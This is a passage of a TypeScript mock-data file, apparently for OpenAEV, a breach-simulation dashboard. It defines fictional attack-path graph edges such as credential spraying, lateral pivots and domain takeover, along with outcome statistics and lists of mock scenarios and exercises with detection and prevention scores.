    { edge_id:'cs-al-spray16', edge_type:'asset_link', edge_source:'cs-act-spray16', edge_target:'cs-ep02' },
    { edge_id:'cs-al-spray17', edge_type:'asset_link', edge_source:'cs-act-spray17', edge_target:'cs-ep02' },
    { edge_id:'cs-al-spray05', edge_type:'asset_link', edge_source:'cs-act-spray05', edge_target:'cs-ep03' },
    { edge_id:'cs-al-spray06', edge_type:'asset_link', edge_source:'cs-act-spray06', edge_target:'cs-ep04' },
    { edge_id:'cs-al-spray07', edge_type:'asset_link', edge_source:'cs-act-spray07', edge_target:'cs-ep05' },
    { edge_id:'cs-al-spray08', edge_type:'asset_link', edge_source:'cs-act-spray08', edge_target:'cs-ep06' },
    { edge_id:'cs-al-spray09', edge_type:'asset_link', edge_source:'cs-act-spray09', edge_target:'cs-ep07' },
    { edge_id:'cs-al-spray10', edge_type:'asset_link', edge_source:'cs-act-spray10', edge_target:'cs-ep08' },
    { edge_id:'cs-al-spray11', edge_type:'asset_link', edge_source:'cs-act-spray11', edge_target:'cs-ep07' },
    { edge_id:'cs-al-spray12', edge_type:'asset_link', edge_source:'cs-act-spray12', edge_target:'cs-ep04' },
    // Pivot edges (EP→EP lateral movement)
    { edge_id:'cs-pivot-01-02', edge_type:'pivot', edge_source:'cs-ep01', edge_target:'cs-ep02', edge_label:'Jenkins RCE → SMB lateral (credential reuse)' },
    { edge_id:'cs-pivot-02-03', edge_type:'pivot', edge_source:'cs-ep02', edge_target:'cs-ep03', edge_label:'svc_db credentials from web.config → DB access' },
    { edge_id:'cs-pivot-02-04', edge_type:'pivot', edge_source:'cs-ep02', edge_target:'cs-ep04', edge_label:'Administrator creds found in app config → jump server' },
    { edge_id:'cs-pivot-04-05', edge_type:'pivot', edge_source:'cs-ep04', edge_target:'cs-ep05', edge_label:'Domain Admin → workstation WS-01 via RDP' },
    { edge_id:'cs-pivot-04-06', edge_type:'pivot', edge_source:'cs-ep04', edge_target:'cs-ep06', edge_label:'Domain Admin → workstation WS-02 via SMB (detected)' },
    { edge_id:'cs-pivot-04-08', edge_type:'pivot', edge_source:'cs-ep04', edge_target:'cs-ep08', edge_label:'Domain Admin → file server (sensitive data exfiltration)' },
  ],
  attack_path_stats: {
    stats_prevented: 2,
    stats_detected: 3,
    stats_undetected: 7,
    stats_pending: 7,
    stats_total_actions: 12,
    stats_executed_actions: 12,
    stats_captured_endpoints: 6,
    stats_captured_files: 6,
    stats_captured_credentials: 9,
    stats_captured_users: 6,
    stats_captured_cves: 4,
  },
  attack_path_definitions: [
    { path_id:'cs-p1', path_name:'Credential Spray → Domain Pivoting', path_color:'#e91e63',
      node_ids:['cs-ep01','cs-ep02','cs-ep03','cs-ep04','cs-ep05','cs-ep06','cs-ep07','cs-ep08'],
      path_outcome:'partial',
      path_fail_reason:'DC access PREVENTED by MDE identity protection',
      failed_from_node_id:'cs-ep07',
      path_segment_reasons:{
        'cs-ep01->cs-ep02':'Jenkins RCE → credential reuse via SMB spray',
        'cs-ep02->cs-ep03':'svc_db password from web.config → DB server',
        'cs-ep02->cs-ep04':'Administrator creds found → jump server',
        'cs-ep04->cs-ep05':'Domain Admin RDP to workstation',
        'cs-ep04->cs-ep06':'SMB lateral movement (DETECTED by CrowdStrike)',
        'cs-ep04->cs-ep07':'DC access PREVENTED by MDE',
        'cs-ep04->cs-ep08':'File server access — sensitive files exfiltrated',
      },
    },
  ],
};



const EXERCISE_ID_MAP: Record<string, AttackPathData> = {
  'aa000000-0000-0000-0000-000000000001': MOCK_SCENARIO_APT_DOMAIN,
  'ab000000-0000-0000-0000-000000000002': MOCK_SCENARIO_NEW_1PATH_SUCCESS,
  'ab000000-0000-0000-0000-000000000003': MOCK_SCENARIO_NEW_1PATH_FAILED,
  'ac000000-0000-0000-0000-000000000004': MOCK_SCENARIO_NEW_2PATH_50EP,
  'ad000000-0000-0000-0000-000000000005': MOCK_SCENARIO_NEW_60EP_LATERAL,
  'ae000000-0000-0000-0000-000000000006': MOCK_SCENARIO_NEW_30EP_INJONLY,
  'af000000-0000-0000-0000-000000000007': MOCK_SCENARIO_CRED_SPRAY,
  'ag000000-0000-0000-0000-000000000008': MOCK_SCENARIO_CRED_SPRAY_NO_PIVOT,
};

export function getMockScenarioByExerciseId(exerciseId?: string): AttackPathData {
  if (exerciseId && EXERCISE_ID_MAP[exerciseId]) {
    return EXERCISE_ID_MAP[exerciseId];
  }
  return getMockScenario();
}

export const SCENARIO_SIMULATIONS_MAP: Record<string, Array<{
  id: string;
  name: string;
  status: string;
  date: string;
  score: number;
}>> = {
  // 1 scenario — all 8 simulations are runs under it
  'new-scen-0000-0000-0000-000000000001': [
    { id: 'aa000000-0000-0000-0000-000000000001', name: '4 Attack Paths — APT Domain Takeover', status: 'FINISHED', date: '2026-06-10T09:00:00Z', score: 34 },
    { id: 'ab000000-0000-0000-0000-000000000003', name: 'Finance Portal Breach — Run #2 (Failed)', status: 'FINISHED', date: '2026-06-08T09:00:00Z', score: 28 },
    { id: 'ab000000-0000-0000-0000-000000000002', name: 'Finance Portal Breach — Run #1 (Success)', status: 'FINISHED', date: '2026-06-01T09:00:00Z', score: 72 },
    { id: 'ac000000-0000-0000-0000-000000000004', name: 'Enterprise Red Team Campaign — Run #1', status: 'FINISHED', date: '2026-06-05T09:00:00Z', score: 41 },
    { id: 'ad000000-0000-0000-0000-000000000005', name: 'APT Lateral Movement — Full Campaign', status: 'FINISHED', date: '2026-06-03T09:00:00Z', score: 25 },
    { id: 'ae000000-0000-0000-0000-000000000006', name: 'Full Vulnerability Sweep — Injectors Only', status: 'FINISHED', date: '2026-06-12T09:00:00Z', score: 58 },
    { id: 'ag000000-0000-0000-0000-000000000008', name: 'Credential Spray Campaign — Injectors Only (No Pivoting)', status: 'FINISHED', date: '2026-06-13T09:00:00Z', score: 61 },
    { id: 'af000000-0000-0000-0000-000000000007', name: 'Credential Spray Campaign — Multi-Param Spray', status: 'FINISHED', date: '2026-06-15T09:00:00Z', score: 63 },
  ],
};

export const MOCK_CHAINING_SCENARIO_IDS = new Set([
  'new-scen-0000-0000-0000-000000000001',
]);

export const MOCK_CHAINING_EXERCISE_IDS = new Set([
  'aa000000-0000-0000-0000-000000000001',
  'ab000000-0000-0000-0000-000000000002',
  'ab000000-0000-0000-0000-000000000003',
  'ac000000-0000-0000-0000-000000000004',
  'ad000000-0000-0000-0000-000000000005',
  'ae000000-0000-0000-0000-000000000006',
  'af000000-0000-0000-0000-000000000007',
  'ag000000-0000-0000-0000-000000000008',
]);

export const MOCK_SCENARIO_LIST = [
  {
    scenario_id: 'new-scen-0000-0000-0000-000000000001',
    scenario_name: '4 Attack Paths — APT Domain Takeover',
    scenario_severity: 'critical' as const,
    scenario_category: 'attack-scenario',
    scenario_platforms: ['Windows'] as unknown as string[],
    scenario_tags: [] as string[],
    scenario_updated_at: '2026-06-15T08:00:00Z',
    scenario_created_at: '2026-05-01T08:00:00Z',
    scenario_mail_from: 'mock@openaev.local',
  },
];

const mockScore = (avgResult: 'FAILED' | 'PARTIAL' | 'SUCCESS', pct: number) => [
  { avgResult, type: 'DETECTION' as const, distribution: [{ label: 'Detected', value: pct }, { label: 'Not Detected', value: 100 - pct }] },
  { avgResult, type: 'PREVENTION' as const, distribution: [{ label: 'Prevented', value: Math.max(0, pct - 15) }, { label: 'Not Prevented', value: 100 - Math.max(0, pct - 15) }] },
];

export const MOCK_EXERCISE_LIST = [
  {
    exercise_id: 'aa000000-0000-0000-0000-000000000001',
    exercise_name: '4 Attack Paths — APT Domain Takeover',
    exercise_status: 'FINISHED' as const,
    exercise_start_date: '2026-06-10T09:00:00Z',
    exercise_updated_at: '2026-06-10T11:00:00Z',
    exercise_tags: [] as string[],
    exercise_targets: [],
    exercise_global_score: mockScore('PARTIAL', 34),
  },
  {
    exercise_id: 'ab000000-0000-0000-0000-000000000002',
    exercise_name: 'Finance Portal Breach — Run #1 (Success)',
    exercise_status: 'FINISHED' as const,
    exercise_start_date: '2026-06-01T09:00:00Z',
    exercise_updated_at: '2026-06-01T11:00:00Z',
    exercise_tags: [] as string[],
    exercise_targets: [],
    exercise_global_score: mockScore('SUCCESS', 72),
  },
  {
    exercise_id: 'ab000000-0000-0000-0000-000000000003',
    exercise_name: 'Finance Portal Breach — Run #2 (Failed)',
    exercise_status: 'FINISHED' as const,
    exercise_start_date: '2026-06-08T09:00:00Z',
    exercise_updated_at: '2026-06-08T11:00:00Z',
    exercise_tags: [] as string[],
    exercise_targets: [],
    exercise_global_score: mockScore('FAILED', 28),
  },
  {
    exercise_id: 'ac000000-0000-0000-0000-000000000004',
    exercise_name: 'Enterprise Red Team Campaign — Run #1',
    exercise_status: 'FINISHED' as const,
    exercise_start_date: '2026-06-05T09:00:00Z',
    exercise_updated_at: '2026-06-05T11:00:00Z',
    exercise_tags: [] as string[],
    exercise_targets: [],
    exercise_global_score: mockScore('PARTIAL', 41),
  },
  {
    exercise_id: 'ad000000-0000-0000-0000-000000000005',
    exercise_name: 'APT Lateral Movement — Full Campaign',
    exercise_status: 'FINISHED' as const,
    exercise_start_date: '2026-06-03T09:00:00Z',
    exercise_updated_at: '2026-06-03T11:00:00Z',
    exercise_tags: [] as string[],
    exercise_targets: [],
    exercise_global_score: mockScore('FAILED', 25),
  },
  {
    exercise_id: 'ae000000-0000-0000-0000-000000000006',
    exercise_name: 'Full Vulnerability Sweep — Injectors Only',
    exercise_status: 'FINISHED' as const,
    exercise_start_date: '2026-06-12T09:00:00Z',
    exercise_updated_at: '2026-06-12T11:00:00Z',
    exercise_tags: [] as string[],
    exercise_targets: [],
    exercise_global_score: mockScore('PARTIAL', 58),
  },
  {
    exercise_id: 'ag000000-0000-0000-0000-000000000008',
    exercise_name: 'Credential Spray Campaign — Injectors Only (No Pivoting)',
    exercise_status: 'FINISHED' as const,
    exercise_start_date: '2026-06-13T09:00:00Z',
    exercise_updated_at: '2026-06-13T11:00:00Z',
    exercise_tags: [] as string[],
    exercise_targets: [],
    exercise_global_score: mockScore('PARTIAL', 61),
  },
  {
    exercise_id: 'af000000-0000-0000-0000-000000000007',
    exercise_name: 'Credential Spray Campaign — Multi-Param Spray',
    exercise_status: 'FINISHED' as const,
    exercise_start_date: '2026-06-15T09:00:00Z',
    exercise_updated_at: '2026-06-15T11:00:00Z',
    exercise_tags: [] as string[],
    exercise_targets: [],
    exercise_global_score: mockScore('PARTIAL', 63),
  },
];
